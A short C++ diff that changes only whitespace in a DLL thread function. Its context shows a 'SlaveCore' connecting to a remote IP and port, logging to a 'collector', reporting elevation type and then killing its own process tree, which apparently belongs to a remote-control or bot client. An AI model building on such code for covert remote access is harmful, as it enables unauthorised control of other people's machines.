@@ -53,8 +53,8 @@ DWORD WINAPI subdll(void)
 		LOG.setIdentity(Common::identity);
 		LOG.addObserver(new Log::LogToConsole);
 		LOG.addObserver(new Log::LogToCollector);
-		Common::ConnectionInfo info = getConnectionInfo();	    
-		
+		Common::ConnectionInfo info = getConnectionInfo();
+
 		Inhibition::SlaveCore slave(info);
 		LOG << GetElevationType();
 		LOG << "Trying connection on " + slave.getConnection().ip + ":" + Common::toString(slave.getConnection().port);
@@ -82,8 +82,8 @@ DWORD WINAPI subdll(void)
 	{
 	}
 	CATCH_UNKNOWN_EXCEPTION
-	
-    System::Process::This thisProcess;
+
+	System::Process::This thisProcess;
 	thisProcess.killHierarchy();
 	return EXIT_SUCCESS;
 }
